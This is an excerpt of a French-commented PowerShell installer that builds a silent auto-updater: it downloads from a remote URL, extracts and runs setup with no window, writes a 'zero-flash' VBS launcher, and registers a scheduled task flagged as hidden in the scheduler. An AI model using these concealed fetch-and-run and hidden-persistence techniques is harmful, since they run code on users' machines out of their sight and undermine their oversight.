...
# FIX 1 : Pre-charge l'assembly ZIP via Reflection pour eviter tout appel a csc.exe
$u += '# Pre-load ZIP assembly silently (avoids csc.exe flash from Add-Type)'                                            + "`r`n"
...
$u += '            $bust = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()'                                                 + "`r`n"
$u += '            $raw  = $wc.DownloadString($VerBaseUrl + "?t=" + $bust).Trim()'                                      + "`r`n"
...
# FIX 2 : Extract-Zip n'utilise plus Add-Type (assembly deja charge en haut du script)
...
$u += '        # Assembly already loaded at script start - no Add-Type needed here'                                     + "`r`n"
...
# FIX 3 : Run-Setup utilise ProcessStartInfo pour un controle total de la fenetre
...
$u += '        # FIX: Use ProcessStartInfo for guaranteed no-window launch'                                             + "`r`n"
...
#  FIX 4 : VBS entierement reecrit - double couche wscript+cmd
#  garantit zero flash meme sur les systemes les plus sensibles
# ----------------------------------------------------------------
Write-Step "3/5" "Generating Launcher.vbs (truly silent, zero flash) ..."

# FIX: cmd /c start "" /b + wscript style=0 = double masquage garanti
$vbs  = '# ---- Launcher.vbs - zero-flash PowerShell launcher ----'                                                     + "`r`n"
...
#  FIX 5 : La tache pointe directement sur wscript.exe + VBS
#           sans passer par cmd.exe intermediaire
# ----------------------------------------------------------------
Write-Step "4/5" ("Registering scheduled task : " + $TASK_NAME + " ...")

Unregister-ScheduledTask -TaskName $TASK_NAME -Confirm:$false -ErrorAction SilentlyContinue

# FIX: wscript.exe lance directement le VBS - pas de cmd.exe intermediaire
# Le VBS gere lui-meme le masquage de PowerShell avec style=0
...
$taskSettings  = New-ScheduledTaskSettingsSet `
                    ...
                    -Hidden                          # <-- FIX: masque la tache dans le planificateur
...
# FIX: wscript.exe avec style 0 + bWaitOnReturn=True
# => aucun flash, bloquant, entierement cache
